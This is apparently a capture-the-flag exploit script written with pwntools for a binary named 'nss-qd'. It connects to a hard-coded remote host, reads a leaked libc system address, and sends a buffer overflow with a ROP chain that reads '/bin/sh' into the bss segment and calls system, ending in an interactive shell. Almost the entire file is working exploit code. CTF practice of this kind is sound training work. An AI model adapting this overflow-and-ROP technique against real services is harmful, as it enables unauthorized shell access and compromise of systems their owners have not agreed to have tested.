# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './nss-qd'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
else:
    host = '1.116.210.145'
    port = '28232'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def cmd(num):
    sla(':',num)

# one_gad = one_gadget(libc.path)

def attack():
    
    ru('0x')
    system_addr = rint(len('7f64ec9c1410'))
    binsh_addr = 0x18f352 + system_addr - 0x045420

    pop_rdi_ret = elf.search(asm('pop rdi; ret')).next()
    pop_rsi_ret = elf.search(asm('pop rsi; pop r15 ; ret')).next()
    leave_ret = elf.search(asm('leave;ret')).next()
    read_plt = elf.plt['read']
    bss = elf.bss(0x100)
    
    payload = 'a'*0x88 + flat(pop_rsi_ret ,bss ,0 ,read_plt , pop_rdi_ret , bss ,pop_rdi_ret+1,system_addr )
    se(payload)

    payload = '/bin/sh\x00'

    # dbg('read')
    raw_input()
    se(payload)
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   nss-qd.py
@Time    :   2022/08/03 13:55:21
@Author  :   Niyah 
'''